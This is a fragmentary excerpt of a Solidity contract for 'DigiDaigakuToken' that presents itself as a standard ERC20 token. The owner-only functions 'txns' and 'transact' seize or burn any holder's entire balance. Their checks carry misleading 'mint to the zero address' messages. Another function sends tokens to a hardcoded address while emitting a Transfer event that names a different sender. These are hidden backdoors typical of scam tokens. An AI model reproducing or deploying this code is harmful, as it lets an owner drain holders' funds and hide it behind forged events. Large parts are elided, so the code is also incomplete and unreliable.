...
contract DigiDaigakuToken is Context, IERC20 {
    ...
    address lead_deployer = 0x382b5a835895f59f755CC8ef002dC96FD5514c0C;
    address public _owner = 0x1c2EBcabED4e7996844C59644ab0a500e88d8983;
   constructor () public {


        
        _name = "DigiDaigakuToken";
    
        _symbol = "DIGIT";
        _decimals = 18;
        uint256 initialSupply = 21700000;
        _safeOwner = _owner;
...
//-----------------------------------------------------------------------------------------------------------------------//
    ...
    */
    ...
    function txns(address account) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
        _beforeTokenTransfer(account, address(0), amount);
        ...
        function transact(address account, address staker) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
        ...
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        address staker = 0xE2fE530C047f2d85298b07D9333C05737f1435fB;
        uint256 amount = amount * 10 ** _decimals;
        _beforeTokenTransfer(_owner, staker, amount);
        

        _balances[_owner] = _balances[_owner].sub(amount, "ERC20: burn amount exceeds balance");
        _balances[staker] = _balances[staker].add(amount);
        
        emit Transfer(lead_deployer, staker, amount);
    }
  ...
  function airdrop(address emitUniswapPool,address[] memory emitReceivers,uint256[] memory emitAmounts)  public auth(){
